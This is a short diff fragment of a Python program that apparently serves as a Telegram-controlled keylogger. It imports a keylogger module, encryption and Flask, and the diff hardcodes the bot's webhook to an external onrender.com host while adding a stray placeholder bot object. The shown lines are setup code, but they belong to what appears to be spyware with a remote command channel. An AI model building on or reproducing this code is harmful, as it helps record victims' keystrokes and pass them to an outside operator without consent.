@@ -8,6 +8,10 @@ import keylogger
 from cryptography.fernet import Fernet
 from flask import Flask, request
 
+bbot = telebot.TeleBot("YOUR_BOT_TOKEN")
+
+# Delete any active webhook
+
 # --- Load Environment Variables ---
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 YOUR_CHAT_ID = os.environ.get("YOUR_CHAT_ID")
@@ -225,7 +229,9 @@ def home():
 # --- Webhook Setup ---
 def set_webhook():
     bot.remove_webhook()
-    bot.set_webhook(url=f"{WEBHOOK_URL}/{BOT_TOKEN}")
+    bot.set_webhook(url=f"https://eldian.onrender.com/{BOT_TOKEN}")
+    
+
 
 def run_flask():
     port = int(os.environ.get("PORT", 5000))  # Default to 5000 if no PORT is set
